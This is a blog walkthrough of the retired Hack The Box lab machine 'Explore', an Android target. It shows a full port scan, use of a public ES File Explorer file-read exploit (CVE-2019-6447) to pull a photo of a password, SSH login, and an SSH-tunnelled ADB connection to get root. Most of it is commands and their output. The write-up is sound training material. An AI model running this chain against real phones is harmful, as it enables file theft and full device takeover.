---
layout: post
author: jseals
title: "Explore: Hack The Box Walk-through"
image: htb-explore/explore.png
---

## Background

Explore is a retired "vulnerable by design" machine created by [bertolis][1] and hosted at [hackthebox.eu][2]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in /home/$USER/user.txt) and escalate privileges to root (get the flag in /root/root.txt).

## Victim Machine Specs
![explore.png](/assets/images/posts/htb-explore/explore.png)

## Reconnaissance
First thing, I'll add the machine's IP to my /etc/hosts file as exlore.htb.

Start it off with a nmap scan, I added the "-p-" flag for this scan to scan all TCP ports instead of the top 1000. Otherwise an important open port would have been missed:

```text
[/home/gn0stic/htb] λ sudo nmap -sV -sC -p- -oA nmap/explore-all-ports -v explore.htb
Starting Nmap 7.92 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating Ping Scan at 12:54
Scanning explore.htb (10.129.248.17) [4 ports]
Completed Ping Scan at 12:54, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:54
Scanning explore.htb (10.129.248.17) [65535 ports]
Discovered open port 2222/tcp on 10.129.248.17
Discovered open port 42135/tcp on 10.129.248.17
Discovered open port 59777/tcp on 10.129.248.17
Discovered open port 37131/tcp on 10.129.248.17
Completed SYN Stealth Scan at 12:55, 48.85s elapsed (65535 total ports)
Initiating Service scan at 12:55
Scanning 4 services on explore.htb (10.129.248.17)
Completed Service scan at 12:56, 97.77s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.248.17.
Initiating NSE at 12:56
Completed NSE at 12:56, 4.07s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.64s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Nmap scan report for explore.htb (10.129.248.17)
Host is up (0.061s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
37131/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:54:51 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 02 Nov 2021 17:54:51 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 02 Nov 2021 17:54:57 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:55:12 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:54:57 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:55:12 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:55:12 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 02 Nov 2021 17:55:12 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).

Service Info: Device: phone

Nmap done: 1 IP address (1 host up) scanned in 152.19 seconds
           Raw packets sent: 65835 (2.897MB) | Rcvd: 65576 (2.623MB)
```

Quite a lot of open ports and some strange services ID'd by nmap as well. As we know from the machine specs, this appears to be an Android machine we're attacking. 


## Enumeration
We got a clear service name here with "ES File Explorer":

```text
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
```

Let's look for any known exploits using searchsploit / the exploit-db:

```text
[/home/gn0stic/htb] λ searchsploit "ES File Explorer"
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                                                                                             | android/remote/50070.py
```

I filtered out the other results as this one looks the most promising. It is for android, so it matches the victim machine's OS. It's usually best to fingerprint the service on the victim before running exploits against it, but without any obvious versioning anywhere, and given this is just a lab box, it's worth a quick attempt.

Downloaded the python exploit code to my local directory, and read through it. Looks pretty straight forward, it allows us to arbitrarily read files from the victim machine.

```text
[/home/gn0stic/htb/explore] λ searchsploit -m android/remote/50070.py
```

Let's run it with the listFiles option:

```text
[/home/gn0stic/htb/explore] λ python3 ./50070.py listFiles explore.htb

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : lib
time : 3/25/20 05:12:02 AM
type : folder
size : 12.00 KB (12,288 Bytes)

name : vndservice_contexts
time : 11/2/21 01:34:37 PM
type : file
size : 65.00 Bytes (65 Bytes)
```

There were quite a lot more files listed, but I cut them for brevity. The exploit seems to work.

## Foothold
Now to work towards more of a foothold on the machine, what file can we find that can help us get closer to a shell or user access. I wasn't able to find much with the listFiles command, so let's try listPics:

```text
[/home/gn0stic/htb/explore] λ python3 ./50070.py listPics explore.htb

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

I wonder what creds.jpg is? Sounds good, let's use the same exploit to download the file locally.

```text
[/home/gn0stic/htb/explore] λ python3 ./50070.py getFile explore.htb /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

Opening the file reviews what looks to be a picture of a password:

![explore-1.png](/assets/images/posts/htb-explore/explore-1.png)


## User Access
We got a password, let's try to login to the ssh service that was listening on port 2222 that we saw from our previous nmap scan:

```text
[/home/gn0stic/htb/explore] λ ssh kristi@explore.htb -p 2222
The authenticity of host '[explore.htb]:2222 ([10.129.248.17]:2222)' can't be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[explore.htb]:2222,[10.129.248.17]:2222' (RSA) to the list of known hosts.
Password authentication
Password: 
:/ $ 
:/ $ whoami
u0_a76
```

Interesting user id, must be an android thing. After some looking around we see the user.txt flag file:

```text
2|:/data $ cd /sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ pwd
/sdcard
:/sdcard $ cat user.txt
f32017174c7c*truncated*
```

## Privilege Escalation to Root User
With user access and a shell, next step is to escalate our privileges to root. From rooting a few cellphones in my day, I recognized the port 5555 from the nmap scan earlier. This is the adb debug port.

Let's try to connect with adb:

```text
[/home/gn0stic/htb/explore] λ adb connect explore.htb:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
```

Doesn't seem to get us far, after some looking it appears the connections need to be sourced from localhost even though the port is exposed from outside. Since we have ssh, we can easily create a ssh tunnel to accomplish this:

Setup the tunnel:
```text
[/home/gn0stic/htb/explore] λ ssh -p 2222 -L 5555:localhost:5555 kristi@explore.htb
Password authentication
Password: 
:/ $ 
```

Verify my localhost is listening on port 5555 (will be redirected to the victim's machine):
```text
[/home/gn0stic] λ netstat -tulpn |grep 5555
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      29937/ssh           
tcp6       0      0 ::1:5555                :::*                    LISTEN      29937/ssh           
```

Try the adb connect through the tunnel:
```text
[/home/gn0stic] λ adb connect localhost:5555
connected to localhost:5555
```

Looks better. We can list the connected devices now:
```text
[/home/gn0stic] λ adb devices
List of devices attached
localhost:5555	device
```

Use adb to get a shell, su to root, and cat the flag:
```text
[/home/gn0stic] λ adb shell

x86_64:/ $ whoami                                                                             
shell

x86_64:/ $ su
:/ # whoami
root

:/ # cd /data/  

:/data # cat root.txt                                                          
f04fc82b6d4*truncated*
```


[1]: https://app.hackthebox.com/users/27897
[2]: https://www.hackthebox.eu